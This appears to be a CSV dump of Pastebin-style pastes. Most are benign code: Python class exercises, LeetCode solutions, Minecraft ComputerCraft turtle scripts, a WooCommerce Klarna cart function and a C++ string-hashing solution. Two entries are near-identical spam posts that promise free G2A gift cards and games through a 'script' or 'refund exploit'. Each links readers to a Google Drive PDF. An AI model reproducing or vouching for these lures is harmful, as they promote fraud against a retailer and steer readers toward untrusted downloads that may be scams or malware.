id,title,username,language,date,content
n8B6viZt,Практика (день 6),Lavig,Python,Monday 20th of May 2024 06:53:26 AM CDT,"def skip():
    print (""_"" * 60)
    print (""_"" * 60)
skip()
# Варіант 2
# Завдання 1
while True:
    even = []
    odd = []
    array = input(""\033[1m\033[33mВведіть через пробіл цілі числа, які бажаєте відсортувати: \033[0m"")
    array = array.split()
    try:
        array = list(map(float, array))
    except:
        print(""\033[1m\033[31mВведений масив має складатися тільки з цілих чисел. Спробуйте ввести інший масив!\033[0m"")
        continue
    is_error = 0
    for i in range(len(array)):
        if array[i].is_integer():
            if array[i] % 2 == 0:
                even.append(int(array[i]))
            else:
                odd.append(int(array[i]))
            array[i] = int(array[i])
            continue
        else:
            is_error = 1
        break
    if is_error == 1:
        print(""\033[1m\033[31mВведений масив має складатися тільки з цілих чисел. Спробуйте ввести інший масив!\033[0m"")
        continue
    else:
        break
if len(even) == 0:
    print(""\033[1m\033[95mПарних чисел у масиві немає\033[0m"")
else:
    print(""\033[1m\033[95mПарні числа:"", ""\033[97m"", end='')
    print(*even, sep=', ', end = ""\033[0m\n"")
if len(odd) == 0:
    print(""\033[92;1mНепарних чисел у масиві немає\033[0m"")
else:
    print(""\033[92;1mНепарні числа:"", ""\033[97m"",  end = '')
    print(*odd, sep=', ', end = ""\033[0m\n"")
skip()
#Завдання 2
while True:
    try:
        first_number = (input(""\033[1m\033[96mВведіть перше число: \033[0m""))
        second_number = (input(""\033[1m\033[33mВведіть друге число: \033[0m""))
        third_number = (input(""\033[1m\033[95mВведіть третє число: \033[0m""))
        float(first_number)
        float(second_number)
        float(third_number)
        break
    except:
        print(""\033[1m\033[31mВводити можна тільки числа. Спробуйте ще раз!\033[0m"")
        continue
first_number = float(first_number)
second_number = float(second_number)
third_number = float(third_number)
if first_number.is_integer() == True:
    first_number = int(first_number)
if second_number.is_integer() == True:
    second_number = int(second_number)
if third_number.is_integer() == True:
    third_number = int(third_number)
m = max(first_number, second_number, third_number)
print(""\033[92;1mНайбільше число –\033[97m"", m, ""\033[0m"")
skip()"
SXBTkLn8,Untitled,phatboislym,Python,Monday 20th of May 2024 06:52:57 AM CDT,"def subsetXORSum(nums: list[int]) -> int:
    size = len(nums)

    def DFS(i: int, xor: int) -> int:
        if i == size:
            return xor

        return DFS(i + 1, xor ^ nums[i]) + DFS(i + 1, xor)

    return DFS(0, 0)"
ENUWQX3s,Untitled,phatboislym,Python,Monday 20th of May 2024 06:41:01 AM CDT,"def subsetXORSum(nums: list[int]) -> int:
    size = len(nums)
    xor = 0

    for i in range(1, 2 ** size):
        subset_map = format(i, f""0{size}b"")
        subset_xor = 0
        for index in range(size):
            if subset_map[index] == '1':
                subset_xor ^= nums[index]
        xor += subset_xor

    return xor
"
w8iqPuKe,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 20th of May 2024 06:21:13 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_520621.pdf

Working as of:
20 May 2024"
CDiYnwkv,mine,S3mpx,Lua,Monday 20th of May 2024 06:08:15 AM CDT,"-- Define the ores to search for
local targetOres = {
    [""minecraft:iron_ore""] = true,
    [""minecraft:lead_ore""] = true,
    [""minecraft:nickel_ore""] = true
}

-- Function to detect the block in front of the turtle
local function detectBlock()
    local success, data = turtle.inspect()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to detect the block above the turtle
local function detectBlockUp()
    local success, data = turtle.inspectUp()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to detect the block below the turtle
local function detectBlockDown()
    local success, data = turtle.inspectDown()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to mine in front of the turtle
local function mineForward()
    while turtle.detect() do
        turtle.dig()
    end
    turtle.forward()
end

-- Function to mine up
local function mineUp()
    while turtle.detectUp() do
        turtle.digUp()
    end
    turtle.up()
end

-- Function to mine down
local function mineDown()
    while turtle.detectDown() do
        turtle.digDown()
    end
    turtle.down()
end

-- Function to mine around the turtle (front, left, right, up, down)
local function mineAround()
    -- Check front
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    
    -- Check left
    turtle.turnLeft()
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    turtle.turnRight()

    -- Check right
    turtle.turnRight()
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    turtle.turnLeft()

    -- Check up
    if detectBlockUp() then
        mineUp()
        mineAround()
        turtle.down()
    end

    -- Check down
    if detectBlockDown() then
        mineDown()
        mineAround()
        turtle.up()
    end
end

-- Main mining function
local function mineTunnel(length)
    for i = 1, length do
        mineForward()
        mineAround()
    end
end

-- Main program
print(""Starting mining program..."")
local tunnelLength = 20  -- Adjust as needed
mineTunnel(tunnelLength)
print(""Mining program completed."")"
vVFBNT6e,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Monday 20th of May 2024 06:07:44 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
20 May 2024"
qA2R2t3Z,data932,TestGuy1,JSON,Monday 20th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a52990ce56b4e7ca4d768c3dbb1691d5fae2f26054c7a6c8e79d7a0c06e18441c8c3e32664b673133286e090347929f61ef445d00455a153125ac15969bfbb07701b4d044d3f1b874b66cddd7599e71f7d5a19ccb01b3a69dbf05f2ee1234a918eb4330c124a536db82e1398d15c25257562ac72f36cf2d7195ea674002b98a4',
  otherdata: [
    '0e4e619b49e7384e0a2dd221fa0b3062',
    '1ab295fdd5c1a6e839d31f84e3f675fe',
    'b52d44fee3667c662cfc8d392dd6ab69',
    'f64caa247189c5077ede7ba25eec2114',
    '5a62e6e89a180c8de173d35cf10a77f0',
    'b19579d9055877f764c99e59be492e86',
    'df854ea86aa9cbf21579dfbcd9a86b77',
    '65eb6ad8cdd36e374bfe733d8f05de46'
  ]
}"
0ZbJ7GnG,WP GlobalCart - klarna-checkout-for-woocommerce,nshelper,PHP,Monday 20th of May 2024 04:50:45 AM CDT,"	public function process_cart() {
		foreach ( WC()->cart->get_cart() as $cart_item ) {
            do_action( 'woocommerce/cart_loop/start', $cart_item );
			if ( $cart_item['quantity'] ) {
				if ( $cart_item['variation_id'] ) {
					$product = wc_get_product( $cart_item['variation_id'] );
				} else {
					$product = wc_get_product( $cart_item['product_id'] );
				}
				$this->total_amount        = self::format_number( $cart_item['line_total'] );
				$this->subtotal_amount     = self::format_number( $cart_item['line_subtotal'] );
				$this->total_tax_amount    = self::format_number( array_sum( $cart_item['line_tax_data']['total'] ) );
				$this->subtotal_tax_amount = self::format_number( array_sum( $cart_item['line_tax_data']['subtotal'] ) );
				$this->quantity            = $cart_item['quantity'];

				$klarna_item = array(
					'reference'             => $this->get_item_reference( $product ),
					'name'                  => $this->get_item_name( $cart_item ),
					'quantity'              => $this->get_item_quantity( $cart_item ),
					'unit_price'            => $this->get_item_price( $cart_item ),
					'tax_rate'              => $this->get_item_tax_rate( $cart_item, $product ),
					'total_amount'          => $this->get_item_total_amount( $cart_item, $product ),
					'total_tax_amount'      => $this->get_item_tax_amount( $cart_item, $product ),
					'total_discount_amount' => $this->get_item_discount_amount( $cart_item, $product ),
				);

				if ( class_exists( 'WC_Subscriptions_Product' ) && WC_Subscriptions_Product::is_subscription( $product ) ) {
					$klarna_item['subscription'] = array(
						'name'           => $klarna_item['name'],
						'interval'       => strtoupper( WC_Subscriptions_Product::get_period( $product ) ),
						'interval_count' => absint( WC_Subscriptions_Product::get_interval( $product ) ),
					);
				}

				// Product type.
				if ( $product->is_downloadable() || $product->is_virtual() ) {
					$klarna_item['type'] = 'digital';
				} else {
					$klarna_item['type'] = 'physical';
				}

				// Add images.
				$klarna_checkout_settings = get_option( 'woocommerce_kco_settings', array() );
				if ( isset( $klarna_checkout_settings ) && 'yes' === $klarna_checkout_settings['send_product_urls'] ) {
					$klarna_item['product_url'] = $this->get_item_product_url( $product );
					if ( $this->get_item_image_url( $product ) ) {
						$klarna_item['image_url'] = $this->get_item_image_url( $product );
					}
				}

				/* This should better support get_catalog_visibility = hidden on product components.  */
				$cart_line_item = apply_filters( 'kco_wc_cart_line_item', $klarna_item, $cart_item );
				if ( $cart_line_item ) {
					$this->order_lines[] = $cart_line_item;
				}
			}
            do_action( 'woocommerce/cart_loop/end', $item );
		}
	}"
tLNmic9W,Untitled,Ahmed_Negm,C++,Monday 20th of May 2024 04:39:24 AM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}

struct Hash{
    const static int mod = 1e9 + 7,p1 = 31,p2 = 37;
    int n;
    vector<int> h1,h2,pw1,pw2;
    Hash(string &s){
        n = s.size();
        h1 = vector<int>(n + 1,0),h2 = vector<int>(n + 1,0);
        pw1 = vector<int>(n + 1,1),pw2 = vector<int>(n + 1,1);
        for(int i = 1; i <= n; i++){
            h1[i] = (1LL * h1[i - 1] * p1 + s[i - 1]) % mod;
            h2[i] = (1LL * h2[i - 1] * p2 + s[i - 1]) % mod;
            pw1[i] = 1LL * pw1[i - 1] * p1 % mod;
            pw2[i] = 1LL * pw2[i - 1] * p2 % mod;
        }
    }

    pair<int,int> get(int l,int r){
        int a = (h1[r] - 1LL * h1[l - 1] * pw1[r - l + 1] % mod + mod) % mod;
        int b = (h2[r] - 1LL * h2[l - 1] * pw2[r - l + 1] % mod + mod) % mod;
        return {a,b};
    }
};


void solve(){
    int n; cin>>n;
    string s; cin>>s;
    string t = s;
    reverse(t.begin(),t.end());
    Hash h1(s),h2(t);

    int ans = 0;
    int res = 1;
    int l = 0, r = n;
    while(l<=r){
        int m = (l + r) / 2;
        bool ok = false;
        for(int i = m+1; i+m <= n and i-m>=1; i++){
            int left = i-m,right = i+m;
            auto a = h1.get(left,right);
            auto b = h2.get(n-right+1,n-left+1);
            if(a == b){
                ok = true;
                break;
            }
        }
        if(ok){
            ans = m;
            res = max(res,2*ans+1);
            l = m + 1;
        }else r = m - 1;
    }


    l = 0, r = n, ans = 0;
    while(l<=r){
        int m = (l + r) / 2;
        bool ok = false;
        for(int i = m+1; i+m < n and i-m>=1; i++){
            int left = i-m,right = i+m+1;
            // cout<<left<<"" ""<<right<<' '<<m<<nl;
            auto a = h1.get(left,right);
            auto b = h2.get(n-right+1,n-left+1);
            if(a == b){
                ok = true;
                break;
            }
        }
        if(ok){
            ans = m;
            res = max(res,2*ans+2);
            l = m + 1;
        }else r = m - 1;
    }


    cout<<res<<nl;

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
TWTsFvGH,move,S3mpx,Lua,Monday 20th of May 2024 04:38:47 AM CDT,"-- Turtle Programm --
-- Category: Movement/Mining --

-- [INFORMATION] --
local appName = ""Move.lua""
local appType = ""Turtle""
local category = ""Movement/Mining""
local version = ""1.0""
local author = ""S3mpx""
-- print info --
print(""[""..appName..""]"")
print(""Programm Type: ""..appType)
print(""Category: ""..category)
print(""Version: ""..version)
print(""written by""..author)

-- [LOCALS] --

local x = """"
local y = """"

-- [FUNKTIONS] --

-- go(x) --
local function go(x)
	for i=1, x do
		turtle.dig()
		turtle.forward()
	end
end

-- up(x) --
local function up(x)
	for i=1, x do
		turtle.digUp()
		turtle.up()
	end
end

-- down(x) --
local function down(x)
	for i=1, x do
		turtle.digDown()
		turtle.down()
	end
end

-- left(x) --
local function left(x)
	turtle.turnLeft()
	go(x)
end

-- right(x) --
local function right(x)
	turtle.turnRight()
	go(x)
end

-- cobble(x) --
local function cobble(x)
	for i=1, x do
		if turtle.detect() then
			turtle.dig()
		else
			i = i-1
		end
	end
end

-- emptyInventory --
local function emptyInventory()
    right(0)
    right(0)
    for slot = 1, 16 do
        turtle.select(slot)
        while turtle.getItemCount(slot) > 0 do
            if not turtle.drop() then
                print(""Chest is full or no chest behind. Exiting..."")
                return false
            end
        end
    end
    right(0)
    right(0)
    return true
end

-- [MAIN FUNKTION] --

print(""When you're done, type 'done'!"")

while true do
	y = io.read()
	if y == ""empty"" then
		print(""emptying inventory..."")
		emptyInventory()
		print(""success!"")
	end
	if y == ""cobble"" then
		print(""how many blocks? (x)"")
		x = io.read()
		cobble(x)
	end
	if y == ""go"" then
		print(""go(x)?"")
		x = io.read()
		go(x)
	end
	if y == ""up"" then
		print(""up(x)?"")
		x = io.read()
		up(x)
	end
	if y == ""down"" then
		print(""down(x)?"")
		x = io.read()
		down(x)
	end
	if y == ""left"" then
		print(""left(x)?"")
		x = io.read()
		left(x)
	end
	if y == ""right"" then
		print(""right(x)?"")
		x = io.read()
		right(x)
	end
end

-- [END] --"
